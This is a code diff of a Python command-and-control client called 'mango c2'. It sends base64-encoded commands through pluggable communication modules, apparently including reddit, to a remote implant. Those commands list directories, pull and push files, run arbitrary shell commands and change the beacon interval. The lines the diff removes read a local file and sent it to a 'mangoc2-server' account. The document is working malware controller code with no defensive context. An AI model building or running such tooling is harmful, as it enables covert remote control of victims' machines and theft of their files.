@@ -1,10 +1,14 @@
 #!/usr/bin/python3
 
-import os
-import time
-import importlib
-import configparser
+
 from base64 import  b64encode, b64decode
+import cmd
+import configparser
+import importlib
+import os
+import shlex
+import sys
+import time
 
 from commands import commands
 
@@ -13,10 +17,14 @@ SETTINGS_FILE = "settings.ini"
 COMMS_DIR = "comms"
 
 
-class core:
+class client(cmd.Cmd):
+    intro = "\nWelcome to the mango c2 client. Type help or ? to list commands.\n"
+    prompt = '(mango)> '
+
     def __init__(self):
-        self.params = {}
-        self.classes = []
+        self.params = {} # Init parameters
+        self.classes = [] # Imported classes
+        self.mods = {} # Initialized communications modules
 
         # Read settings into self.params
         config = configparser.ConfigParser()
@@ -24,6 +32,12 @@ class core:
         sections = config.sections()
         for s in sections:
             self.params[s] = dict(config.items(s))
+
+        # Define a few class variables
+        # self.interval = int(self.params["core"]["default_interval"])
+        self.platform = self.params["core"]["default_platform"]
+        # self.next_beacon = int(time()) + self.interval
+        # self.prev_beacon = 0
         
         # Dynamically import comms modules
         beacon_files = os.listdir(COMMS_DIR)
@@ -34,38 +48,114 @@ class core:
                     importlib.import_module(COMMS_DIR + "." + b[:-3]), b[:-3])
                 self.classes.append(new_class)
 
-    def do_beacon(self):
-        # TODO: Perform a beacon
-        # Call the receive function, which returns a stack (list) of commands
-        # Execute commands, then send the response back with the preferred method
+        # Initialize all comms classes with their respective params
+        for c in self.classes:
+            name = c.__name__
+            self.mods[name] = c(self.params[name])
+
+        super(client, self).__init__()
+
+    def emptyline(self):
+        """Do nothing for empty lines
+        """
         pass
 
-    def run_core(self):
-        selected = "reddit"
-        mods = {}
+    def do_exit(self, line):
+        """exit
+        Quit the program"""
+        sys.exit(0)
+    
+    def send_cmd(self, cmd):
+        out = b64encode(cmd)
+        print("Sending command...")
+        try:
+            self.mods[self.platform].send(
+                self.mods[self.platform].target,
+                "subject",
+                out
+            )
+        except:
+            print("ERROR: Command failed to send.")
 
-        # Initialize all comms classes
-        for b in self.classes:
-            name = b.__name__
-            mods[name] = (b(self.params[name]))
+    def do_receive(self, line):
+        """receive
+        Check for responses and print their outputs
+        """
+        messages = self.mods[self.platform].receive()
 
-        # for m in mods:
-        #     print(m.params)
-        #     print(m.receive())
+        if not messages:
+            print("No responses found.")
 
-        # Encode the results of a command
-        result = b64encode(
-            commands.do_exec("cat", "/home/kyle/test.txt"))
+        while messages:
+            msg = b64decode(messages.pop())
+            print(msg.decode("utf-8"))
+            print("\n")
 
-        # Send the encoded results of the command
-        mods[selected].send("mangoc2-server", "SUBJECT", result)
+    def do_dir(self, line):
+        """dir [directory]
+        Get the contents of a directory"""
+        args = shlex.split(line)
+        if len(args) != 1:
+            print("Exactly 1 argument is required.")
+            return
+        cmd = "DIR{}".format(args[0]).encode()
+        self.send_cmd(cmd) 
 
+    def do_get(self, line):
+        """get [filename]
+        Get the contents of a file"""
+        args = shlex.split(line)
+        if len(args) != 1:
+            print("Exactly 1 argument is required.")
+        cmd = "GET{}".format(args[0]).encode()
+        self.send_cmd(cmd)
 
+    def do_put(self, line):
+        """put [srcfile] [destfile]
+        Put a local file to a remote file"""
+        # TODO there's a 10,000 character limit for messages on reddit
+        args = shlex.split(line)
+        print(args)
+        if len(args) != 2:
+            print("Exactly 2 arguments are required.")
+            return
+
+        if not os.path.isfile(args[0]):
+            print("ERROR: File {} does not exist.".format(args[0]))
+            return
+        with open (args[0], "r") as f:
+            data = f.read()
+        
+        cmd = "PUT{} {}".format(args[1], data).encode()
+        self.send_cmd(cmd)
+
+    def do_exe(self, line):
+        """exe [cmd]
+        Execute a shell command"""
+        if not line:
+            print("A command is required.")
+        line = "EXE" + line
+        self.send_cmd(line.encode())
+
+    def do_die(self, line):
+        """die
+        Cause the server to exit"""
+        self.send_cmd(b"DIE")
+
+    def do_int(self, line):
+        """int [interval]
+        Set the beacon interval to a new value, in seconds"""
+        args = shlex.split(line)
+        if len(args) != 1:
+            print("Exactly 1 argument is required.")
+            return
+        cmd = "INT{}".format(args[0]).encode()
+        self.send_cmd(cmd) 
 
 
 def main():
-    test = core()
-    test.run_core()
+    test = client()
+    test.cmdloop()
 
 
 if __name__ == "__main__":
